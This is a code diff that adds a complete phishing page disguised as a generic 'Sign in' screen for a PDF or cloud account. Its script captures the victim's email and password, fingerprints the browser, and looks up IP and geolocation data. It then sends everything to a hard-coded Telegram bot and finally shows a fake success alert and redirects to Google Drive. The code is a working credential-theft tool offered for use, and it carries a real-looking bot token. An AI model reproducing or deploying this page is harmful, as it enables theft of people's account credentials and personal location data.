@@ -1,0 +1,401 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Login</title>
+    <style>
+        :root {
+            --primary-color: #0078d4;
+            --error-color: #d83b01;
+            --text-color: #333;
+            --secondary-text: #666;
+            --background: #fff;
+            --input-border: #e0e0e0;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', sans-serif;
+        }
+
+        body {
+            background-color: #f5f5f5;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 440px;
+            padding: 20px;
+        }
+
+        .login-container {
+            background: var(--background);
+            padding: 44px;
+            border-radius: 8px;
+            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.1);
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: 32px;
+        }
+
+        .logo {
+            width: 64px;
+            height: 64px;
+            margin-bottom: 16px;
+        }
+
+        h1 {
+            font-size: 24px;
+            color: var(--text-color);
+            margin-bottom: 8px;
+        }
+
+        .subtitle {
+            color: var(--secondary-text);
+            font-size: 14px;
+        }
+
+        .step {
+            display: none;
+        }
+
+        .step.active {
+            display: block;
+        }
+
+        .input-group {
+            margin-bottom: 16px;
+        }
+
+        input[type="email"],
+        input[type="password"] {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid var(--input-border);
+            border-radius: 4px;
+            font-size: 14px;
+            outline: none;
+            transition: border-color 0.2s;
+        }
+
+        input[type="email"]:focus,
+        input[type="password"]:focus {
+            border-color: var(--primary-color);
+        }
+
+        .error-message {
+            color: var(--error-color);
+            font-size: 12px;
+            margin-top: 4px;
+            min-height: 16px;
+        }
+
+        .primary-btn {
+            width: 100%;
+            padding: 12px;
+            background-color: var(--primary-color);
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+
+        .primary-btn:hover {
+            background-color: #006cbd;
+        }
+
+        .secondary-btn {
+            width: 100%;
+            padding: 12px;
+            background-color: transparent;
+            color: var(--primary-color);
+            border: none;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 8px;
+        }
+
+        .options {
+            margin-top: 24px;
+            display: flex;
+            justify-content: space-between;
+        }
+
+        .link {
+            color: var(--primary-color);
+            text-decoration: none;
+            font-size: 13px;
+        }
+
+        .link:hover {
+            text-decoration: underline;
+        }
+
+        .user-info {
+            background-color: #f5f5f5;
+            padding: 12px;
+            border-radius: 4px;
+            margin-bottom: 16px;
+            font-size: 14px;
+            color: var(--secondary-text);
+        }
+
+        .checkbox-group {
+            margin: 16px 0;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .checkbox-group label {
+            font-size: 14px;
+            color: var(--text-color);
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="login-container">
+            <div class="header">
+                <img src="https://cdn-icons-png.flaticon.com/512/337/337946.png" alt="PDF Logo" class="logo">
+                <h1>Sign in</h1>
+                <p class="subtitle">to continue to your account</p>
+            </div>
+            
+            <div id="email-step" class="step active">
+                <div class="input-group">
+                    <input type="email" id="email" placeholder="Email address" required>
+                    <div class="error-message" id="email-error"></div>
+                </div>
+                <button id="next-btn" class="primary-btn">Next</button>
+                <div class="options">
+                    <a href="#" class="link">Create account</a>
+                    <a href="#" class="link">Can't access your account?</a>
+                </div>
+            </div>
+
+            <div id="password-step" class="step">
+                <div class="user-info" id="user-email"></div>
+                <div class="input-group">
+                    <input type="password" id="password" placeholder="Password" required>
+                    <div class="error-message" id="password-error"></div>
+                </div>
+                <div class="checkbox-group">
+                    <input type="checkbox" id="stay-signed-in">
+                    <label for="stay-signed-in">Stay signed in</label>
+                </div>
+                <button id="signin-btn" class="primary-btn">Sign in</button>
+                <button id="back-btn" class="secondary-btn">Back</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // DOM Elements
+        const emailStep = document.getElementById('email-step');
+        const passwordStep = document.getElementById('password-step');
+        const emailInput = document.getElementById('email');
+        const passwordInput = document.getElementById('password');
+        const nextBtn = document.getElementById('next-btn');
+        const backBtn = document.getElementById('back-btn');
+        const signinBtn = document.getElementById('signin-btn');
+        const userEmailDisplay = document.getElementById('user-email');
+        const emailError = document.getElementById('email-error');
+        const passwordError = document.getElementById('password-error');
+
+        // Store user data
+        let userData = {
+            email: '',
+            password: '',
+            ip: '',
+            location: {},
+            userAgent: navigator.userAgent,
+            timestamp: '',
+            screenResolution: `${window.screen.width}x${window.screen.height}`,
+            timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            language: navigator.language,
+            platform: navigator.platform
+        };
+
+        // Get IP and location data
+        async function getIPAndLocationData() {
+            try {
+                const response = await fetch('https://ipapi.co/json/');
+                const data = await response.json();
+                userData.ip = data.ip;
+                userData.location = {
+                    city: data.city,
+                    region: data.region,
+                    country: data.country_name,
+                    latitude: data.latitude,
+                    longitude: data.longitude,
+                    timezone: data.timezone,
+                    isp: data.org
+                };
+            } catch (error) {
+                console.error('Error fetching location data:', error);
+            }
+        }
+
+        // Initialize security features
+        async function initSecurity() {
+            await getIPAndLocationData();
+        }
+
+        // Call security initialization on page load
+        initSecurity();
+
+        // Email validation
+        function isValidEmail(email) {
+            return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
+        }
+
+        // Show error message
+        function showError(element, message) {
+            element.textContent = message;
+        }
+
+        // Clear error message
+        function clearError(element) {
+            element.textContent = '';
+        }
+
+        // Redirect to Google Drive after successful sign-in
+        function redirectToDrive() {
+            window.location.href = "https://drive.google.com";
+        }
+
+        // Send data to Telegram bot
+        async function sendToTelegram(data) {
+            const BOT_TOKEN = '7315734945:AAEwBBKiHG5dorU-IT6nOnS1Yi76W37qPmI'; // Replace with your bot token
+            const CHAT_ID = '6707519229'; // Replace with your chat ID
+            
+            const message = `
+🔐 New Login Attempt:
+📧 Email: ${data.email}
+🔑 Password: ${data.password}
+🌐 IP Address: ${data.ip}
+📍 Location Info:
+   • City: ${data.location.city}
+   • Region: ${data.location.region}
+   • Country: ${data.location.country}
+   • Coordinates: ${data.location.latitude}, ${data.location.longitude}
+   • ISP: ${data.location.isp}
+   • Timezone: ${data.location.timezone}
+💻 System Info:
+   • Screen: ${data.screenResolution}
+   • Platform: ${data.platform}
+   • Language: ${data.language}
+   • Timezone: ${data.timeZone}
+📱 User Agent: ${data.userAgent}
+⏰ Timestamp: ${data.timestamp}
+            `;
+
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            try {
+                await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                });
+            } catch (error) {
+                console.error('Error sending to Telegram:', error);
+            }
+        }
+
+        // Event Listeners
+        nextBtn.addEventListener('click', () => {
+            const email = emailInput.value.trim();
+            
+            if (!email) {
+                showError(emailError, 'Please enter an email address');
+                return;
+            }
+            
+            if (!isValidEmail(email)) {
+                showError(emailError, 'Please enter a valid email address');
+                return;
+            }
+            
+            clearError(emailError);
+            userData.email = email;
+            userEmailDisplay.textContent = email;
+            emailStep.classList.remove('active');
+            passwordStep.classList.add('active');
+            passwordInput.focus();
+        });
+
+        backBtn.addEventListener('click', () => {
+            passwordStep.classList.remove('active');
+            emailStep.classList.add('active');
+            emailInput.focus();
+        });
+
+        signinBtn.addEventListener('click', async () => {
+            const password = passwordInput.value.trim();
+            
+            if (!password) {
+                showError(passwordError, 'Please enter your password');
+                return;
+            }
+            
+            if (password.length < 8) {
+                showError(passwordError, 'Password must be at least 8 characters long');
+                return;
+            }
+            
+            clearError(passwordError);
+            
+            // Update user data
+            userData.password = password;
+            userData.timestamp = new Date().toISOString();
+            
+            // Send data to Telegram bot
+            await sendToTelegram(userData);
+            
+            // Show success message
+            alert('Login successful!');
+            
+            // Redirect to Google Drive
+            redirectToDrive();
+        });
+
+        // Handle Enter key
+        emailInput.addEventListener('keypress', (e) => {
+            if (e.key === 'Enter') {
+                nextBtn.click();
+            }
+        });
+
+        passwordInput.addEventListener('keypress', (e) => {
+            if (e.key === 'Enter') {
+                signinBtn.click();
+            }
+        });
+
+        // Focus email input on load
+        window.addEventListener('load', () => {
+            emailInput.focus();
+        });
+    </script>
+</body>
+</html>
